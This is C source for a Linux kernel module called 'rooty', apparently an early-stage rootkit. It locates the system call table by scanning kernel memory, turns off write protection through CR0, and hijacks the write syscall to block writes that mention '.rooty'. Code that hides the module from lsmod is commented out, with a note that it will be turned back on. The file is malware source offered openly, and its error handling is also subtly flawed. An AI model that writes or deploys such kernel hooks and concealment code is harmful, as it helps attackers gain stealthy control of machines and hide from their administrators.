#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kobject.h>

MODULE_LICENSE("GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

/* #define __NR_CLOSE (__NR_SYSCALL_BASE+ 6)  */

/* define what Architecture is used */
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);

/* find sys_call_table */

psize *sys_call_table;
psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_close] == (psize *) sys_close) {
   return &sctable[0];
  } 
  i += sizeof(void *);
 }
 return NULL;
}

asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
 int r;
 char *proc_protect = ".rooty";
 char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
 copy_from_user(kbuff,buff,255);
 if (strstr(kbuff,proc_protect)) {
  kfree(kbuff);
  return EEXIST;
 }
 r = (*o_write)(fd,buff,count);
 kfree(kbuff);
 return r;
}

int rooty_init(void) {
  
/* Hide module from lsmod - commented out for troubleshooting reasons, will be activated again at the end  
  list_del_init(&__this_module.list);
  kobject_del(&THIS_MODULE->mkobj.kobj); */
  
  printk("rooty: module loaded\n");
 
/* added check for sys_call_table found or not  */
  if (sys_call_table = (psize *) find()) {
      printk("rooty: sys_call_table found at %p\n",sys_call_table);
  } else {
      printk("rooty: sys_call_table not found\n");
  }
  
  /* disable WP (write protect) in cr0 */
  write_cr0(read_cr0() & (~ 0x10000)); 
  
  /* write hijack */
  o_write = (void *) xchg(&sys_call_table[__NR_write],rooty_write); 
  
  /* turn WP back on */
  write_cr0(read_cr0() | 0x10000); 
  
 return 0;
}

void rooty_exit(void) {
  
  /* change back to before rooty execution */
    write_cr0(read_cr0() & (~ 0x10000));
    xchg(&sys_call_table[__NR_write],o_write);
    write_cr0(read_cr0() | 0x10000);
  
  printk("rooty: module removed\n");
}
